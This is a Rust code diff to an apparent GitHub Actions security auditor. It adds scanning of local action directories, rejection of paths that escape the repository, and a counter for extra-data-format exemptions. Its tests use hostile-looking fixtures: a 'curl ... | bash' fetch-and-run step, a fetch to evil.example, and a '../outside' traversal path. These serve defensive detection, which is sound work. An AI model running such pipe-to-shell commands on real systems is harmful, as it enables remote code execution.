@@ -1,7 +1,7 @@
 use anyhow::{Context, Result};
 use serde_norway::Value;
 use std::collections::HashSet;
-use std::path::Path;
+use std::path::{Component, Path, PathBuf};
 use std::process::ExitCode;
 use std::sync::Arc;
 use tokio::sync::Semaphore;
@@ -22,12 +22,14 @@ use crate::auth;
 use crate::config::Config;
 use crate::github::GitHubClient;
 use crate::output::{self, AuditFinding, AuditMatch, AuditReport};
-use crate::workflow::{self, ActionRef};
+use crate::workflow::{self, ActionRef, LocalActionRef};
 use colored::Colorize;
 
 /// Reason string for matches allowed via the `trusted-hosts` config list.
 /// Shared between the allow site and the repo-config notice that counts them.
 pub(crate) const REASON_TRUSTED_HOST: &str = "trusted host";
+/// Reason string for matches allowed via `extra-data-formats` config entries.
+pub(crate) const REASON_EXTRA_DATA_FORMAT: &str = "extra data format URL";
 
 /// Accumulates findings and (when verbose) allowed matches during a scan.
 ///
@@ -40,6 +42,9 @@ pub struct AuditCollector {
     /// Matches allowed via `trusted-hosts` — counted regardless of verbosity
     /// so the repo-config notice doesn't depend on `--verbose`.
     pub trusted_host_allowed: usize,
+    /// Matches allowed via `extra-data-formats` — counted regardless of
+    /// verbosity so repo-config notices surface score shaping.
+    pub extra_data_format_allowed: usize,
 }
 
 impl AuditCollector {
@@ -49,6 +54,7 @@ impl AuditCollector {
             allowed: Vec::new(),
             verbose,
             trusted_host_allowed: 0,
+            extra_data_format_allowed: 0,
         }
     }
 
@@ -59,6 +65,9 @@ impl AuditCollector {
     pub fn push_allowed(&mut self, allowed: AuditMatch) {
         if allowed.reason == REASON_TRUSTED_HOST {
             self.trusted_host_allowed += 1;
+        }
+        if allowed.reason == REASON_EXTRA_DATA_FORMAT {
+            self.extra_data_format_allowed += 1;
         }
         if self.verbose {
             self.allowed.push(allowed);
@@ -127,6 +136,32 @@ pub async fn run(
                     "  {} run-block scan of {display_name}: {e}",
                     "skipped".yellow()
                 );
+            }
+        }
+
+        for action in workflow::scan_local_actions(&content) {
+            let key = format!("local:{}", action.path);
+            if !scanned_actions.insert(key) {
+                continue;
+            }
+
+            if !quiet {
+                eprintln!("  {} {}", "Scanning local".blue(), action.path);
+            }
+
+            let findings_before = collector.findings.len();
+            match scan_local_action_source(repo_root, &action, &mut collector, config) {
+                Ok(ActionScanStatus::Complete) => {}
+                Ok(ActionScanStatus::Incomplete) => {
+                    eprintln!("warning: incomplete scan of local action {}", action.path);
+                }
+                Err(e) => {
+                    eprintln!("warning: could not scan local action {}: {e}", action.path);
+                }
+            }
+            for finding in collector.findings.iter_mut().skip(findings_before) {
+                finding.workflow_file = Some(display_name.clone());
+                finding.workflow_line = Some(action.line_number);
             }
         }
 
@@ -269,6 +304,12 @@ pub async fn run(
         }
         if trusted_host_allowed > 0 {
             parts.push(format!("trusted-host fetches: {trusted_host_allowed}"));
+        }
+        if collector.extra_data_format_allowed > 0 {
+            parts.push(format!(
+                "extra-data-format fetches: {}",
+                collector.extra_data_format_allowed
+            ));
         }
         if !parts.is_empty() {
             eprintln!(
@@ -881,6 +922,8 @@ fn check_url_patterns(
                 allowed_reason.get_or_insert("versioned URL");
             } else if config.is_host_trusted(url) {
                 allowed_reason.get_or_insert(REASON_TRUSTED_HOST);
+            } else if config.is_extra_data_format_exempt(url) {
+                allowed_reason.get_or_insert(REASON_EXTRA_DATA_FORMAT);
             } else if config.is_data_format_exempt(url) {
                 allowed_reason.get_or_insert("data format URL");
             } else if audit_patterns::fetch_piped_to_jq(line) {
@@ -1025,6 +1068,131 @@ fn select_source_files(
         targets.push((path.clone(), kind));
     }
     targets
+}
+
+fn collect_local_source_files(action_dir: &Path) -> Result<Vec<(PathBuf, SourceFileKind)>> {
+    fn visit(dir: &Path, base: &Path, targets: &mut Vec<(PathBuf, SourceFileKind)>) -> Result<()> {
+        let mut entries = Vec::new();
+        for entry in std::fs::read_dir(dir).with_context(|| format!("reading {}", dir.display()))? {
+            entries.push(entry?);
+        }
+        entries.sort_by_key(|e| e.path());
+
+        for entry in entries {
+            let path = entry.path();
+            let relative = path
+                .strip_prefix(base)
+                .unwrap_or(&path)
+                .to_string_lossy()
+                .replace('\\', "/");
+
+            if is_vendored_path(&relative) {
+                continue;
+            }
+
+            // `file_type()` does not follow symlinks, so a symlinked entry is
+            // neither file nor dir here and is skipped. Deliberate: it keeps
+            // traversal inside the action directory (a symlink can't redirect
+            // the scan outside it) at the cost of not scanning symlinked source
+            // — an acceptable trade-off since local actions are first-party.
+            let file_type = entry.file_type()?;
+            if file_type.is_dir() {
+                visit(&path, base, targets)?;
+            } else if file_type.is_file()
+                && let Some(kind) = source_file_kind(&relative)
+            {
+                targets.push((path, kind));
+            }
+        }
+        Ok(())
+    }
+
+    let mut targets = Vec::new();
+    visit(action_dir, action_dir, &mut targets)?;
+    Ok(targets)
+}
+
+fn source_file_kind(relative: &str) -> Option<SourceFileKind> {
+    if relative == "action.yml" || relative == "action.yaml" {
+        Some(SourceFileKind::ActionYml)
+    } else if relative.ends_with(".js") || relative.ends_with(".ts") {
+        Some(SourceFileKind::JavaScript)
+    } else if relative.ends_with(".py") {
+        Some(SourceFileKind::Python)
+    } else if relative == "Dockerfile" || relative.ends_with(".dockerfile") {
+        Some(SourceFileKind::Dockerfile)
+    } else {
+        None
+    }
+}
+
+fn local_action_dir(repo_root: &Path, action: &LocalActionRef) -> Result<PathBuf> {
+    let Some(rel) = action.path.strip_prefix("./") else {
+        anyhow::bail!("local action path must start with ./");
+    };
+    if rel.is_empty()
+        || !Path::new(rel)
+            .components()
+            .all(|c| matches!(c, Component::Normal(_)))
+    {
+        anyhow::bail!("local action path escapes the repository");
+    }
+    Ok(repo_root.join(rel))
+}
+
+fn scan_local_action_source(
+    repo_root: &Path,
+    action: &LocalActionRef,
+    collector: &mut AuditCollector,
+    config: &Config,
+) -> Result<ActionScanStatus> {
+    let action_dir = local_action_dir(repo_root, action)?;
+    if !action_dir.is_dir() {
+        anyhow::bail!("{} is not a directory", action_dir.display());
+    }
+
+    let targets = collect_local_source_files(&action_dir)?;
+    if targets.is_empty() {
+        return Ok(ActionScanStatus::Complete);
+    }
+
+    let mut complete = true;
+    for (path, kind) in targets {
+        let content = match std::fs::read_to_string(&path) {
+            Ok(content) => content,
+            Err(_) => {
+                complete = false;
+                continue;
+            }
+        };
+        let relative = path
+            .strip_prefix(&action_dir)
+            .unwrap_or(&path)
+            .to_string_lossy()
+            .replace('\\', "/");
+        let source_label = format!("{} ({relative})", action.path);
+        match kind {
+            SourceFileKind::ActionYml => match serde_norway::from_str::<Value>(&content) {
+                Ok(yaml) => {
+                    scan_action_yml_runs(&yaml, &source_label, &action.path, collector, config);
+                }
+                Err(_) => {
+                    complete = false;
+                }
+            },
+            SourceFileKind::JavaScript => {
+                scan_js_content(&content, &source_label, &action.path, collector, config);
+            }
+            SourceFileKind::Python => {
+                scan_py_content(&content, &source_label, &action.path, collector, config);
+            }
+            SourceFileKind::Dockerfile => {
+                scan_dockerfile_content(&content, &source_label, &action.path, collector, config);
+            }
+        }
+    }
+
+    Ok(ActionScanStatus::from_complete(complete))
 }
 
 async fn scan_action_source(
@@ -1598,6 +1766,7 @@ more stuff
         assert!(c.findings.is_empty());
         assert_eq!(c.allowed.len(), 1);
         assert_eq!(c.allowed[0].reason, "data format URL");
+        assert_eq!(c.extra_data_format_allowed, 0);
     }
 
     #[test]
@@ -1628,6 +1797,7 @@ more stuff
         assert!(c.findings.is_empty());
         assert_eq!(c.allowed.len(), 1);
         assert_eq!(c.allowed[0].reason, "data format URL");
+        assert_eq!(c.extra_data_format_allowed, 0);
     }
 
     #[test]
@@ -1707,6 +1877,7 @@ more stuff
         assert!(c.findings.is_empty());
         assert_eq!(c.allowed.len(), 1);
         assert_eq!(c.allowed[0].reason, "data format URL");
+        assert_eq!(c.extra_data_format_allowed, 0);
     }
 
     #[test]
@@ -1722,6 +1893,7 @@ more stuff
         assert!(c.findings.is_empty());
         assert_eq!(c.allowed.len(), 1);
         assert_eq!(c.allowed[0].reason, "data format URL");
+        assert_eq!(c.extra_data_format_allowed, 0);
     }
 
     #[test]
@@ -1741,7 +1913,8 @@ more stuff
         );
         assert!(c.findings.is_empty());
         assert_eq!(c.allowed.len(), 1);
-        assert_eq!(c.allowed[0].reason, "data format URL");
+        assert_eq!(c.allowed[0].reason, REASON_EXTRA_DATA_FORMAT);
+        assert_eq!(c.extra_data_format_allowed, 1);
     }
 
     #[test]
@@ -1780,6 +1953,7 @@ more stuff
         assert!(c.findings.is_empty());
         assert_eq!(c.allowed.len(), 1);
         assert_eq!(c.allowed[0].reason, "trusted host");
+        assert_eq!(c.trusted_host_allowed, 1);
     }
 
     #[test]
@@ -2170,6 +2344,82 @@ runs:
             tree_entry("node_modules/x/index.js", "blob"),
         ];
         assert!(select_source_files(&tree, "").is_empty());
+    }
+
+    #[test]
+    fn collect_local_source_files_filters_vendored_dirs() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let action_dir = dir.path().join(".github/actions/local");
+        std::fs::create_dir_all(action_dir.join("node_modules/dep")).unwrap();
+        std::fs::create_dir_all(action_dir.join("dist")).unwrap();
+        std::fs::write(action_dir.join("action.yml"), "name: local\n").unwrap();
+        std::fs::write(
+            action_dir.join("dist/index.js"),
+            "fetch('https://example.com/x')",
+        )
+        .unwrap();
+        std::fs::write(
+            action_dir.join("node_modules/dep/index.js"),
+            "fetch('https://evil.example/x')",
+        )
+        .unwrap();
+
+        let got = collect_local_source_files(&action_dir).unwrap();
+        let paths: Vec<_> = got
+            .iter()
+            .map(|(path, _)| {
+                path.strip_prefix(&action_dir)
+                    .unwrap()
+                    .to_string_lossy()
+                    .replace('\\', "/")
+            })
+            .collect();
+        assert_eq!(paths, vec!["action.yml", "dist/index.js"]);
+    }
+
+    #[test]
+    fn scan_local_action_source_finds_composite_fetches() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let action_dir = dir.path().join(".github/actions/local");
+        std::fs::create_dir_all(&action_dir).unwrap();
+        std::fs::write(
+            action_dir.join("action.yml"),
+            r#"
+runs:
+  using: composite
+  steps:
+    - run: curl -fsSL https://example.com/install.sh | bash
+"#,
+        )
+        .unwrap();
+
+        let action = LocalActionRef {
+            path: "./.github/actions/local".to_string(),
+            line_number: 12,
+        };
+        let mut collector = AuditCollector::new(false);
+        let status =
+            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();
+        assert_eq!(status, ActionScanStatus::Complete);
+        assert_eq!(collector.findings.len(), 1);
+        assert!(collector.findings[0].description.contains("piped to shell"));
+        assert_eq!(
+            collector.findings[0].source_file,
+            "./.github/actions/local (action.yml)"
+        );
+    }
+
+    #[test]
+    fn scan_local_action_source_rejects_parent_escape() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let action = LocalActionRef {
+            path: "./../outside".to_string(),
+            line_number: 1,
+        };
+        let mut collector = AuditCollector::new(false);
+        assert!(
+            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).is_err()
+        );
     }
 
     #[test]
